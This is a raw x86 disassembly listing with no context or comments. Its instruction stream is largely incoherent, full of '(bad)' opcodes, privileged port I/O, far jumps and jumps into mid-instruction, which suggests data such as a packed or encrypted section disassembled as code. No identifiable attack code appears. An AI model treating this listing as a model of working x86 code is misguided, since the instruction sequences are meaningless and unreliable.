  40a310:	xor    eax,0xc04d4f8d
  40a315:	dec    esi
  40a316:	sahf   
  40a317:	out    0x41,al
  40a319:	adc    BYTE PTR [edx],cl
  40a31b:	pop    ecx
  40a31c:	mov    dl,0x6c
  40a31e:	jmp    0xe67fc816
  40a323:	or     edx,DWORD PTR [ebp+0x20290ffe]
  40a329:	hlt    
  40a32a:	lock mov bl,0xce
  40a32d:	das    
  40a32e:	(bad)  
  40a32f:	jl     0x40a2b9
  40a331:	fadd   QWORD PTR [edi+0xc]
  40a334:	outs   dx,DWORD PTR ds:[esi]
  40a335:	cmp    eax,0x60f4edeb
  40a33a:	or     edx,DWORD PTR [edx+0xd]
  40a33d:	inc    ebx
  40a33e:	retf   0xa4c1
  40a341:	neg    ebp
  40a343:	iret   
  40a344:	mov    eax,ds:0x4e0df311
  40a349:	ins    DWORD PTR es:[edi],dx
  40a34a:	push   ebx
  40a34b:	and    BYTE PTR [ebx-0x73bcaffb],dl
  40a351:	inc    ebp
  40a352:	out    0x81,eax
  40a354:	scas   eax,DWORD PTR es:[edi]
  40a355:	arpl   WORD PTR [esi+eax*1+0x76782588],ax
  40a35c:	sbb    ecx,DWORD PTR [ebx+0x53]
  40a35f:	shl    BYTE PTR [ebx-0x1d],1
  40a362:	ror    BYTE PTR [edi-0x51],cl
  40a365:	ds mov edi,0x5a530e35
  40a36b:	in     eax,0xdf
  40a36d:	sub    dh,bl
  40a36f:	aam    0xce
  40a371:	inc    ebp
  40a372:	push   ebp
  40a373:	addr16 cld 
  40a375:	sub    ebx,DWORD PTR fs:[esi]
  40a378:	push   ebp
  40a379:	in     al,dx
  40a37a:	mov    bh,0xaa
  40a37c:	gs ins BYTE PTR es:[edi],dx
  40a37e:	jae    0x40a324
  40a380:	fld    DWORD PTR [esi]
  40a382:	or     al,0xaa
  40a384:	or     ebp,DWORD PTR [eax]
  40a386:	iret   
  40a387:	imul   esi,DWORD PTR [eax-0x67088b63],0x7a
  40a38e:	arpl   WORD PTR [ebp-0x41b0f6ea],dx
  40a394:	xor    dh,BYTE PTR [esi]
  40a396:	mov    ebp,0x35ef943c
  40a39b:	and    al,bh
  40a39d:	lahf   
  40a39e:	cmp    edi,DWORD PTR [edi]
  40a3a0:	into   
  40a3a1:	rcl    BYTE PTR [ecx-0x33],0xac
  40a3a5:	and    BYTE PTR [ecx-0x1affcb1e],0xd3
  40a3ac:	pop    ss
  40a3ad:	pop    ds
  40a3ae:	pop    edx
  40a3af:	mov    dl,0x4d
  40a3b1:	pop    ebp
  40a3b2:	xchg   BYTE PTR [esi-0x34],ch
  40a3b5:	lds    esp,FWORD PTR [edx+0x302fd4fd]
  40a3bb:	cwde   
  40a3bc:	sub    BYTE PTR [edi+eiz*1-0xc],0xda
  40a3c1:	mov    edx,0xc25b95db
  40a3c6:	mov    edx,0xe58aa3e7
  40a3cb:	ss pop es
  40a3cd:	cmp    edi,esp
  40a3cf:	mov    bh,0x68
  40a3d1:	cmp    ah,cl
  40a3d3:	and    al,0xdc
  40a3d5:	stos   BYTE PTR es:[edi],al
  40a3d6:	and    esi,ebx
  40a3d8:	and    ecx,DWORD PTR [ecx-0x4]
  40a3db:	pushf  
  40a3dc:	jns    0x40a3bd
  40a3de:	loope  0x40a39f
  40a3e0:	xor    ebx,DWORD PTR [eax+0x1fc4c0fa]
  40a3e6:	xchg   esp,eax
  40a3e7:	lods   al,BYTE PTR ds:[esi]
  40a3e8:	xchg   esi,eax
  40a3e9:	into   
  40a3ea:	inc    esp
  40a3eb:	shl    BYTE PTR ds:0xa4cab4ed,1
  40a3f1:	xor    ch,0xef
  40a3f4:	sub    BYTE PTR [esi+0x42],cl
  40a3f7:	stos   BYTE PTR es:[edi],al
  40a3f8:	inc    ecx
  40a3f9:	push   ecx
  40a3fa:	jns    0x40a461
  40a3fc:	ds adc eax,0x1d517faa
  40a402:	cdq    
  40a403:	add    eax,0x79cd3813
  40a408:	test   DWORD PTR [ecx+0x61],esi
  40a40b:	scas   al,BYTE PTR es:[edi]
  40a40c:	rol    BYTE PTR [eax+0x4e],1
  40a40f:	enter  0x95b4,0x16
  40a413:	push   edi
  40a414:	xchg   edx,eax
  40a415:	scas   al,BYTE PTR es:[edi]
  40a416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a417:	lds    ebx,FWORD PTR [ebp-0x1af6b774]
  40a41d:	sbb    BYTE PTR [eax-0x336ed73c],0xdf
  40a424:	and    edi,ebp
  40a426:	jbe    0x40a3b0
  40a428:	es push ecx
  40a42a:	scas   eax,DWORD PTR es:[edi]
  40a42b:	jl     0x40a483
  40a42d:	fs mov eax,0x9b1c1a15
  40a433:	mov    al,ds:0xebabd9b3
  40a438:	inc    eax
  40a439:	add    eax,ebx
  40a43b:	inc    edx
  40a43c:	mov    bl,0xa
  40a43e:	jg     0x40a404
  40a440:	push   esp
  40a441:	or     ecx,esp
  40a443:	mov    ds:0x920b19e6,eax
  40a448:	icebp  
  40a449:	add    DWORD PTR [esi+0x30],esi
  40a44c:	xlat   BYTE PTR ds:[ebx]
  40a44d:	clc    
  40a44e:	adc    al,0xc
  40a450:	jg     0x40a4c9
  40a452:	mov    ebp,0x34e962bd
  40a457:	scas   eax,DWORD PTR es:[edi]
  40a458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a459:	mov    ds:0x94d38b78,al
  40a45e:	data16 aaa 
  40a460:	push   ecx
  40a461:	stos   BYTE PTR es:[edi],al
  40a462:	adc    DWORD PTR [eax-0x324a3d73],edx
  40a468:	pop    ebx
  40a469:	popw   ss
  40a46b:	cld    
  40a46c:	inc    edi
  40a46d:	sub    al,0x21
  40a46f:	or     eax,0x8a82399c
  40a474:	lods   al,BYTE PTR ds:[esi]
  40a475:	mov    al,ds:0xd64dc596
  40a47a:	test   eax,0x22cc7c56
  40a47f:	or     eax,DWORD PTR [ebx]
  40a481:	jp     0x40a4fb
  40a483:	cmp    BYTE PTR [ebp-0x6c],0xe3
  40a487:	cmp    bh,BYTE PTR [eax+0x5dbad406]
  40a48d:	add    bl,BYTE PTR [eax]
  40a48f:	mov    bl,0xa1
  40a491:	popa   
  40a492:	(bad)  
  40a493:	jle    0x40a4de
  40a495:	mov    ecx,0x344e3a0e
  40a49a:	mov    ds:0x57479c90,eax
  40a49f:	xchg   esi,eax
  40a4a0:	or     bh,cl
  40a4a2:	xor    eax,0x6ae2f771
  40a4a7:	add    bl,BYTE PTR [eax+0x3]
  40a4aa:	sbb    eax,0x5426beae
  40a4af:	mov    esp,0x766880e9
  40a4b4:	xor    ah,cl
  40a4b6:	inc    ebx
  40a4b7:	or     al,0xd4
  40a4b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4ba:	sub    dl,BYTE PTR [edx+0x77]
  40a4bd:	outs   dx,BYTE PTR ds:[esi]
  40a4be:	mov    dl,0xab
  40a4c0:	ss push es
  40a4c2:	daa    
  40a4c3:	cmp    ch,BYTE PTR [ebp-0x19028df4]
  40a4c9:	cmp    ebx,0x41
  40a4cc:	ficomp DWORD PTR [ebp+0x3f32ad93]
  40a4d2:	repz mov edx,0x90b83a61
  40a4d8:	addr16 ffreep st(0)
  40a4db:	test   DWORD PTR [edi-0x5515086b],edx
  40a4e1:	stos   BYTE PTR es:[edi],al
  40a4e2:	arpl   bp,di
  40a4e4:	mov    bh,0xad
  40a4e6:	jae    0x40a46e
  40a4e8:	xor    al,0x5e
  40a4ea:	cdq    
  40a4eb:	jg     0x40a524
  40a4ed:	not    edx
  40a4ef:	pusha  
  40a4f0:	xchg   ebx,eax
  40a4f1:	sbb    eax,0x5ee7440
  40a4f6:	outs   dx,DWORD PTR ds:[esi]
  40a4f7:	push   ds
  40a4f8:	xor    BYTE PTR [edi+0x5f],al
  40a4fb:	mov    gs,WORD PTR [ecx]
  40a4fd:	ret    0x14ec
  40a500:	cmp    eax,0x4985f351
  40a505:	mov    bh,0xa2
  40a507:	inc    esp
  40a508:	fidiv  WORD PTR [edx-0xf]
  40a50b:	pop    ds
  40a50c:	inc    esi
  40a50d:	in     eax,dx
  40a50e:	nop
  40a50f:	pop    edi
  40a510:	pop    DWORD PTR [ebp+0x36e98f04]
  40a516:	dec    ecx
  40a517:	test   DWORD PTR [eax-0x64],edx
  40a51a:	shl    ebx,1
  40a51c:	jg     0x40a55e
  40a51e:	sbb    DWORD PTR [edx-0x50],ecx
  40a521:	mov    eax,0x761a7ce6
  40a526:	rol    BYTE PTR [ebp-0x60a9ade2],cl
  40a52c:	xor    al,0x45
  40a52e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a52f:	icebp  
  40a530:	lea    esp,[esi-0x10]
  40a533:	mov    esi,0xac8f7a23
  40a538:	aad    0xa3
  40a53a:	(bad)  
  40a53b:	push   0x3f749033
  40a540:	xchg   ecx,eax
  40a541:	pop    edx
  40a542:	xor    ah,BYTE PTR [esi-0x5c516250]
  40a548:	xchg   edx,eax
  40a549:	dec    ecx
  40a54a:	inc    edi
  40a54b:	push   cs
  40a54c:	ins    DWORD PTR es:[edi],dx
  40a54d:	push   0xa3321524
  40a552:	fsubr  DWORD PTR [ecx+0x3525b9b6]
  40a558:	push   0x8422c2e7
  40a55d:	jl     0x40a4fd
  40a55f:	mov    ebp,0xd42b7f61
  40a564:	cmp    al,0xf6
  40a566:	mov    ecx,0xfe73e03a
  40a56b:	ss jns 0x40a55e
  40a56e:	ss jg  0x40a4f6
  40a571:	push   esp
  40a572:	push   edi
  40a573:	ja     0x40a554
  40a575:	in     al,dx
  40a576:	stos   DWORD PTR es:[edi],eax
  40a577:	push   es
  40a578:	fsub   DWORD PTR [ecx-0x5d]
  40a57b:	push   ebx
  40a57c:	dec    esp
  40a57d:	add    dl,BYTE PTR [eax+0x53fbef54]
  40a583:	push   0xffffff81
  40a585:	fimul  WORD PTR [bx+di]
  40a588:	fisttp QWORD PTR [ecx+0x59]
  40a58b:	pop    es
  40a58c:	dec    eax
  40a58d:	xchg   ebx,eax
  40a58e:	pop    es
  40a58f:	clc    
  40a590:	mov    edx,0x3f0bfaf6
  40a595:	(bad)  
  40a596:	cli    
  40a597:	or     eax,0x17528733
  40a59c:	and    DWORD PTR [esi+ecx*2-0x2d],0x95d9e27d
  40a5a4:	cmp    eax,0x342d3dd5
  40a5a9:	ds sbb ecx,ebx
  40a5ac:	rcr    BYTE PTR [edi],0x1b
  40a5af:	jge    0x40a561
  40a5b1:	loope  0x40a5f2
  40a5b3:	(bad)  
  40a5b5:	ret    
  40a5b6:	mov    edx,0x33275aa1
  40a5bb:	inc    esi
  40a5bc:	shr    BYTE PTR [eax+ebx*1+0x1d],1
  40a5c0:	sub    ah,BYTE PTR [edi+ebp*2+0x16]
  40a5c4:	jb     0x40a61b
  40a5c6:	fcomp  DWORD PTR [eax+0x11]
  40a5c9:	adc    eax,0x1add0fd1
  40a5ce:	ds nop
  40a5d0:	xchg   DWORD PTR [ecx+esi*1-0x27],ebx
  40a5d4:	sub    al,0xfd
  40a5d6:	push   0x1f7ff11
  40a5db:	xor    DWORD PTR [ebx-0x14],0x28
  40a5df:	add    eax,0xb88574f
  40a5e4:	mov    eax,0x29d5bc1c
  40a5e9:	jae    0x40a669
  40a5eb:	sar    BYTE PTR [esi+0xf],0xf9
  40a5ef:	not    ch
  40a5f1:	jecxz  0x40a5a4
  40a5f3:	stos   DWORD PTR es:[edi],eax
  40a5f4:	sahf   
  40a5f5:	mov    BYTE PTR [edx-0x4ff0441d],cl
  40a5fb:	leave  
  40a5fc:	jmp    ecx
  40a5fe:	retf   0x93f4
  40a601:	cmc    
  40a602:	idiv   BYTE PTR [ebp+0x74]
  40a605:	pushf  
  40a606:	xchg   edi,eax
  40a607:	cwde   
  40a608:	sub    ebx,ebx
  40a60a:	cmovg  ebx,DWORD PTR [eax]
  40a60d:	push   ebp
  40a60e:	mov    eax,ds:0x21e64364
  40a613:	push   esp
  40a614:	in     al,0x56
  40a616:	call   0xd9bd549f
  40a61b:	push   cs
  40a61c:	push   esp
  40a61d:	and    BYTE PTR [eax-0x28],cl
  40a620:	mov    dl,0xe3
  40a622:	jo     0x40a605
  40a624:	lods   eax,DWORD PTR ds:[esi]
  40a625:	imul   eax,DWORD PTR [ecx-0x1f],0x50
  40a629:	daa    
  40a62a:	mov    bh,0x94
  40a62c:	into   
  40a62d:	add    DWORD PTR [edi+0x35],eax
  40a630:	mov    BYTE PTR [ebx-0x1ff236a7],al
  40a636:	xor    al,0xc1
  40a638:	sub    esi,eax
  40a63a:	aam    0x74
  40a63c:	and    al,0xd1
  40a63e:	fdivr  DWORD PTR [edx+0x2b91bad6]
  40a644:	leave  
  40a645:	lods   eax,DWORD PTR ds:[esi]
  40a646:	lds    ebp,FWORD PTR [esi]
  40a648:	pop    edi
  40a649:	cld    
  40a64a:	imul   ebp,DWORD PTR [edx],0xfeee2752
  40a650:	ror    dl,cl
  40a652:	and    ch,BYTE PTR [edx-0x18]
  40a655:	in     al,0x24
  40a657:	clc    
  40a658:	lea    ebp,[edi-0x49]
  40a65b:	jbe    0x40a66e
  40a65d:	dec    ebp
  40a65e:	sbb    BYTE PTR [edi+ebp*4-0x58],ah
  40a662:	and    esi,DWORD PTR [eax+0x74bbc46e]
  40a668:	data16 loop 0x40a64a
  40a66b:	in     eax,0x6a
  40a66d:	xchg   ecx,eax
  40a66e:	ins    BYTE PTR es:[edi],dx
  40a66f:	(bad)  
  40a670:	fsubr  DWORD PTR [ecx+0x5cab94a]
  40a676:	xchg   ebx,eax
  40a677:	scas   eax,DWORD PTR es:[edi]
  40a678:	or     eax,0x5e39b7
  40a67d:	repnz lahf 
  40a67f:	mov    bh,BYTE PTR [ebp+ebp*4-0x63fd341c]
  40a686:	dec    edx
  40a687:	leave  
  40a688:	outs   dx,DWORD PTR ds:[esi]
  40a689:	add    BYTE PTR [ebp+0x5f295517],ch
  40a68f:	ja     0x40a671
  40a691:	inc    edx
  40a692:	jmp    0x719:0x3291d043
  40a699:	pop    ds
  40a69a:	ja     0x40a61e
  40a69c:	das    
  40a69d:	fidivr DWORD PTR [edx]
  40a69f:	addr16 inc esi
  40a6a1:	data16 jae 0x40a687
  40a6a4:	(bad)  
  40a6a5:	or     DWORD PTR [ebx],eax
  40a6a7:	inc    edi
  40a6a8:	adc    dh,dl
  40a6aa:	loopne 0x40a63e
  40a6ac:	jl     0x40a6e1
  40a6ae:	retf   0x17d5
  40a6b1:	mov    dl,0xa
  40a6b3:	lods   eax,DWORD PTR ds:[esi]
  40a6b4:	push   ss
  40a6b5:	mov    bh,0x67
  40a6b7:	add    BYTE PTR [edi],cl
  40a6b9:	out    dx,eax
  40a6ba:	jae    0x40a664
  40a6bc:	(bad)  
  40a6be:	pop    esi
  40a6bf:	sbb    esp,DWORD PTR [ebp+0x51]
  40a6c2:	jno    0x40a6bf
  40a6c4:	clc    
  40a6c5:	jne    0x40a713
  40a6c7:	mov    WORD PTR [edi-0x5e],?
  40a6ca:	xchg   BYTE PTR [esi+0x7d1d5ac7],bl
  40a6d0:	push   ecx
  40a6d1:	inc    ebp
  40a6d2:	pop    esi
  40a6d3:	shl    BYTE PTR [ecx],0x95
  40a6d6:	push   es
  40a6d7:	sub    al,0x87
  40a6d9:	dec    edi
  40a6da:	cs rcr ah,cl
  40a6dd:	mov    ds:0x5beacf04,al
  40a6e2:	xchg   ebx,eax
  40a6e3:	and    BYTE PTR [eax],bl
  40a6e5:	jecxz  0x40a6ee
  40a6e7:	adc    DWORD PTR [edi+0x47],eax
  40a6ea:	push   es
  40a6eb:	cmc    
  40a6ec:	fs inc eax
  40a6ee:	pop    eax
  40a6ef:	nop
  40a6f0:	mov    esi,0xcb375ba0
  40a6f5:	mov    esp,0xe3ea5e3d
  40a6fa:	imul   edx,DWORD PTR [edi],0x90bd638d
  40a700:	sbb    ecx,DWORD PTR [eax]
  40a702:	cwde   
  40a703:	and    al,0x8f
  40a705:	jecxz  0x40a6a3
  40a707:	xor    eax,0x547d9282
  40a70c:	dec    edx
  40a70d:	repnz gs ins BYTE PTR es:[edi],dx
  40a710:	pop    es
  40a711:	xchg   edx,eax
  40a712:	daa    
  40a713:	xchg   esi,eax
  40a714:	aas    
  40a715:	pop    ecx
  40a716:	fwait
  40a717:	and    al,0x32
  40a719:	xor    BYTE PTR [esi-0x4],bh
  40a71c:	xchg   ebx,eax
  40a71d:	in     al,0x18
  40a71f:	int3   
  40a720:	inc    edx
  40a721:	pop    eax
  40a722:	xlat   BYTE PTR ds:[ebx]
  40a723:	or     DWORD PTR [esi+ebx*1+0x40],0xadc0a3b2
  40a72b:	test   al,0x77
  40a72d:	add    ecx,DWORD PTR [eax+ebx*2+0x5c2714e4]
  40a734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a735:	int3   
  40a736:	add    bh,BYTE PTR [ebx]
  40a738:	adc    ch,BYTE PTR [eax]
  40a73a:	jno    0x40a744
  40a73c:	mov    bh,BYTE PTR ds:0x7b9cc422
  40a742:	mov    cl,0x6e
  40a744:	or     BYTE PTR [esi-0x3f],ch
  40a747:	pop    edx
  40a748:	aaa    
  40a749:	jg     0x40a6da
  40a74b:	or     ecx,DWORD PTR [ecx]
  40a74d:	mov    ds:0xa4c4b62e,eax
  40a752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a753:	loope  0x40a76a
  40a755:	mov    eax,0x3a969a59
  40a75a:	int3   
  40a75b:	cld    
  40a75c:	(bad)  
  40a75d:	lods   eax,DWORD PTR ds:[esi]
  40a75e:	push   ecx
  40a75f:	jmp    0x40a7db
  40a761:	enter  0x7e3a,0xf6
  40a765:	xchg   edi,eax
  40a766:	gs pop ss
  40a768:	shl    bh,0x5e
  40a76b:	std    
  40a76c:	pop    ebx
  40a76d:	mov    esi,0xbe41283c
  40a772:	and    cl,BYTE PTR [edx+0x1fe85939]
  40a778:	out    dx,al
  40a779:	or     ebx,0xfffffffb
  40a77c:	je     0x40a7b1
  40a77e:	popf   
  40a77f:	xchg   edi,eax
  40a780:	pop    esp
  40a781:	and    edx,ecx
  40a783:	add    al,BYTE PTR [esi+ecx*1-0x6a]
  40a787:	cmp    edx,DWORD PTR [eax]
  40a789:	xor    BYTE PTR [ecx+0x2e69486a],cl
  40a78f:	xor    eax,0xe106a706
  40a794:	std    
  40a795:	jb     0x40a7f6
  40a797:	loop   0x40a7c3
  40a799:	retf   
  40a79a:	add    cl,ch
  40a79c:	cmp    al,0xc5
  40a79e:	aam    0x74
  40a7a0:	mov    edx,0x61d1bd19
  40a7a5:	jae    0x40a821
  40a7a7:	iret   
  40a7a8:	cli    
  40a7a9:	test   eax,0x6053ca0
  40a7ae:	out    dx,al
  40a7af:	test   cl,al
  40a7b1:	(bad)  
  40a7b2:	and    BYTE PTR [ebp+0x61fa8807],cl
  40a7b8:	rcr    ebp,1
  40a7ba:	xlat   BYTE PTR ds:[ebx]
  40a7bb:	fwait
  40a7bc:	call   0x2b1e0a0b
  40a7c1:	popa   
  40a7c2:	aad    0x20
  40a7c4:	adc    al,BYTE PTR [edi]
  40a7c6:	test   al,0xc4
  40a7c8:	jnp    0x40a759
  40a7ca:	inc    ecx
  40a7cb:	and    eax,0xf3dc713d
  40a7d0:	call   0xb34388c5
  40a7d5:	xor    dh,BYTE PTR [edx-0x74dab946]
  40a7db:	mov    ah,0x9a
  40a7dd:	out    dx,eax
  40a7de:	mov    al,ds:0xf0fd4888
  40a7e3:	push   ebp
  40a7e4:	test   eax,0x7f28999a
  40a7e9:	jp     0x40a7f9
  40a7eb:	cmp    esi,DWORD PTR [eax]
  40a7ed:	aad    0x6a
  40a7ef:	ret    0x4407
  40a7f2:	stos   BYTE PTR es:[edi],al
  40a7f3:	pop    esp
  40a7f4:	cli    
  40a7f5:	sub    DWORD PTR [ecx-0x1a],ebp
  40a7f8:	das    
  40a7f9:	cmp    al,0x72
  40a7fb:	es lahf 
  40a7fd:	add    eax,0xe55a40e0
  40a802:	aam    0x4b
  40a804:	xchg   edi,eax
  40a805:	fwait
  40a806:	mov    edi,0x2252e2ca
  40a80b:	xchg   esi,eax
  40a80c:	sbb    ebx,DWORD PTR [edx+0x5d6718c7]
  40a812:	(bad)  
  40a813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a814:	push   cs
  40a815:	rol    DWORD PTR [esi+0x50],1
  40a818:	lods   eax,DWORD PTR ds:[esi]
  40a819:	jns    0x40a853
  40a81b:	out    0x1,eax
  40a81d:	js     0x40a837
  40a81f:	popf   
  40a820:	rcr    BYTE PTR [eax-0x2dc21561],0x8d
  40a827:	jo     0x40a7f6
  40a829:	inc    esi
  40a82a:	push   es
  40a82b:	and    BYTE PTR [ecx+0x4697c4bd],0x28
  40a832:	leave  
  40a833:	std    
  40a834:	xor    al,0x3
  40a836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a837:	or     eax,0xb6856023
  40a83c:	cmp    DWORD PTR [esi+0x2e],esi
  40a83f:	mov    edx,0xffc36a8c
  40a844:	inc    edx
  40a845:	push   ds
  40a846:	pop    es
  40a847:	sti    
  40a848:	pop    ds
  40a849:	mov    al,ds:0x6feee840
  40a84e:	and    esi,DWORD PTR [esi+0x23]
  40a851:	(bad)  
  40a852:	mov    bh,0xa8
  40a854:	arpl   WORD PTR [esi+0x371c1daf],cx
  40a85a:	fcom   QWORD PTR [ebp+0x36]
  40a85d:	xchg   ebp,eax
  40a85e:	test   BYTE PTR [edx],dh
  40a860:	inc    ecx
  40a861:	addr16 data16 aam 0xa5
  40a865:	hlt    
  40a866:	sbb    eax,0xf05519bd
  40a86b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a86c:	jl     0x40a805
  40a86e:	daa    
  40a86f:	sbb    esi,DWORD PTR [ebp+0x35]
  40a872:	ret    
  40a873:	es adc al,ah
  40a876:	mov    eax,0xdb8ed885
  40a87b:	add    eax,0x5b312a5d
  40a880:	push   es
  40a881:	(bad)  
  40a882:	retf   
  40a883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a884:	stos   BYTE PTR es:[edi],al
  40a885:	daa    
  40a886:	cmc    
  40a887:	mov    ds:0xc72d3c80,al
  40a88c:	test   ch,dh
  40a88e:	cs pop ebx
  40a890:	cdq    
  40a891:	icebp  
  40a892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a893:	xchg   edi,eax
  40a894:	adc    BYTE PTR [ebx-0x109259ac],ah
  40a89a:	xlat   BYTE PTR ds:[ebx]
  40a89b:	cli    
  40a89c:	fwait
  40a89d:	mov    al,0x8e
  40a89f:	retf   0xce9d
  40a8a2:	fistp  QWORD PTR [esi-0x49]
  40a8a5:	pop    esp
  40a8a6:	pop    esp
  40a8a7:	jmp    0x73c3:0x71c2e827
  40a8ae:	nop
  40a8af:	pusha  
  40a8b0:	in     al,0x4f
  40a8b2:	jne    0x40a88a
  40a8b4:	push   ebx
  40a8b5:	cli    
  40a8b6:	out    0x6b,eax
  40a8b8:	inc    esp
  40a8b9:	or     eax,0x2332162
  40a8be:	repz cmp BYTE PTR [ebx+edi*1],dl
  40a8c2:	mov    dh,0x26
  40a8c4:	jno    0x40a919
  40a8c6:	and    BYTE PTR [ebx+0x6e],0x94
  40a8ca:	aam    0x56
  40a8cc:	dec    eax
  40a8cd:	mov    edi,cs
  40a8cf:	jmp    0x40a8c6
  40a8d1:	shr    eax,cl
  40a8d3:	jle    0x40a8e1
  40a8d5:	push   ss
  40a8d6:	cs into 
  40a8d8:	popa   
  40a8d9:	adc    ebx,DWORD PTR [esi+0x7b]
  40a8dc:	pop    ss
  40a8dd:	inc    eax
  40a8de:	imul   ebp,esi,0x8
  40a8e1:	push   ss
  40a8e2:	test   BYTE PTR fs:[ecx+esi*2],al
  40a8e6:	int3   
  40a8e7:	je     0x40a878
  40a8e9:	dec    ebx
  40a8ea:	xor    BYTE PTR [ebx],al
  40a8ec:	push   ebp
  40a8ed:	jo     0x40a932
  40a8ef:	sbb    eax,0x36ce83a5
  40a8f4:	xlat   BYTE PTR ds:[ebx]
  40a8f5:	stc    
  40a8f6:	data16 mov bh,0xd
  40a8f9:	pop    esi
  40a8fa:	dec    esi
  40a8fb:	pop    esp
  40a8fc:	mov    eax,0x3e9a00bf
  40a901:	outs   dx,DWORD PTR ds:[esi]
  40a902:	ror    DWORD PTR [ebp-0x35fd82f9],0x6f
  40a909:	sub    al,0x9f
  40a90b:	rol    ah,cl
  40a90d:	mov    BYTE PTR [ebx-0x6c],bl
  40a910:	bound  esp,QWORD PTR [esi+0x5c]
  40a913:	sub    DWORD PTR [ebx],edi
  40a915:	pop    esp
  40a916:	stos   DWORD PTR es:[edi],eax
  40a917:	fsubr  st,st(1)
  40a919:	outs   dx,DWORD PTR ds:[esi]
  40a91a:	xor    eax,0xe721323f
  40a91f:	xor    eax,0xd68ff7f
  40a924:	xor    BYTE PTR fs:[edx-0x53],dh
  40a928:	mov    al,0xce
  40a92a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a92b:	xor    eax,0x4d88eadb
  40a930:	into   
  40a931:	inc    ebx
  40a932:	jmp    0x42a7:0x5a7be673
  40a939:	pop    ebx
  40a93a:	in     eax,dx
  40a93b:	jle    0x40a8d9
  40a93d:	push   es
  40a93e:	inc    ebp
  40a93f:	jbe    0x40a959
  40a941:	sub    DWORD PTR [edi],0x9040e0ce
  40a947:	das    
  40a948:	jge    0x40a93d
  40a94a:	cmp    ch,BYTE PTR [ebx]
  40a94c:	sbb    dl,BYTE PTR fs:[ecx+0x29]
  40a950:	loopne 0x40a8e9
  40a952:	aad    0x49
  40a954:	loopne 0x40a9af
  40a956:	jecxz  0x40a8ed
  40a958:	outs   dx,DWORD PTR ds:[esi]
  40a959:	div    BYTE PTR [eax+edi*1+0x7e0fc98e]
  40a960:	cmp    BYTE PTR [ebp-0x4a],dl
  40a963:	xchg   ebx,eax
  40a964:	adc    edi,DWORD PTR [ebx-0x73e43b4]
  40a96a:	imul   eax,esi,0xffffffd2
  40a96d:	rep outs dx,BYTE PTR ds:[esi]
  40a96f:	mov    esp,0xa10f2141
  40a974:	xchg   edx,eax
  40a975:	and    bl,ch
  40a977:	je     0x40a98e
  40a979:	cmp    eax,DWORD PTR ds:0x2031848a
  40a97f:	loope  0x40a9bc
  40a981:	mov    edx,0x2eec351a
  40a986:	in     al,dx
  40a987:	loopne 0x40a917
  40a989:	sub    eax,ebx
  40a98b:	mov    bl,0x65
  40a98d:	outs   dx,BYTE PTR ds:[esi]
  40a98e:	push   edx
  40a98f:	sahf   
  40a990:	jbe    0x40a961
  40a992:	pop    es
  40a993:	mov    cs,esi
  40a995:	cdq    
  40a996:	or     cl,BYTE PTR [ebx+ebp*1]
  40a999:	xchg   cl,bh
  40a99b:	arpl   bx,cx
  40a99d:	push   esi
  40a99e:	jo     0x40a998
  40a9a0:	fisubr DWORD PTR [eax-0x67]
  40a9a3:	stc    
  40a9a4:	pop    ebx
  40a9a5:	xchg   ebx,eax
  40a9a6:	aas    
  40a9a7:	jbe    0x40aa00
  40a9a9:	add    BYTE PTR [esi],bh
  40a9ab:	push   esp
  40a9ac:	js     0x40a998
  40a9ae:	pop    es
  40a9af:	pop    ebp
  40a9b0:	xchg   esp,eax
  40a9b1:	popf   
  40a9b2:	pop    ss
  40a9b3:	pop    esp
  40a9b4:	aaa    
  40a9b5:	pop    ds
  40a9b6:	jl     0x40aa04
  40a9b8:	test   al,0x42
  40a9ba:	xchg   edx,eax
  40a9bb:	jo     0x40a9fc
  40a9bd:	lea    edx,[eax+0x33]
  40a9c0:	xchg   esp,eax
  40a9c1:	adc    eax,0x99dfdd0c
  40a9c6:	pop    es
  40a9c7:	fisub  DWORD PTR [ecx+ebx*1+0x47]
  40a9cb:	mov    al,ds:0x5bc03030
  40a9d0:	cmc    
  40a9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9d2:	call   0x4936a17e
  40a9d7:	sahf   
  40a9d8:	mov    esi,0x73b0b498
  40a9dd:	out    0x44,eax
  40a9df:	push   ds
  40a9e0:	std    
  40a9e1:	aaa    
  40a9e2:	xor    ah,BYTE PTR [esi]
  40a9e4:	mov    bl,0xe1
  40a9e6:	dec    esp
  40a9e7:	(bad)  
  40a9e8:	arpl   si,ax
  40a9ea:	xor    BYTE PTR [ebx-0x67],bl
  40a9ed:	lods   al,BYTE PTR ds:[esi]
  40a9ee:	or     BYTE PTR [ebp+edx*8-0x45],ch
  40a9f2:	or     DWORD PTR [edi],eax
  40a9f4:	aam    0x1f
  40a9f6:	clc    
  40a9f7:	(bad)  
  40a9f8:	sbb    ecx,esp
  40a9fa:	not    cl
  40a9fc:	adc    esi,eax
  40a9fe:	icebp  
  40a9ff:	es retf 0xd311
  40aa03:	lods   eax,DWORD PTR ds:[esi]
  40aa04:	cmc    
  40aa05:	xor    eax,0x85d1a4ca
  40aa0a:	inc    ecx
  40aa0b:	push   0xffffff99
  40aa0d:	mov    ds:0x1274032b,al
  40aa12:	cli    
  40aa13:	shr    BYTE PTR ds:0x8594dd13,1
  40aa19:	jle    0x40aa78
  40aa1b:	xchg   ebx,eax
  40aa1c:	pop    ds
  40aa1d:	pop    eax
  40aa1e:	outs   dx,DWORD PTR ds:[esi]
  40aa1f:	mov    dh,0xf5
  40aa21:	inc    eax
  40aa22:	clc    
  40aa23:	into   
  40aa24:	jmp    0x40a9a9
  40aa26:	jb     0x40aa91
  40aa28:	lods   al,BYTE PTR ds:[esi]
  40aa29:	push   ecx
  40aa2a:	mov    dl,0x30
  40aa2c:	lods   eax,DWORD PTR ds:[esi]
  40aa2d:	inc    edx
  40aa2e:	and    edx,eax
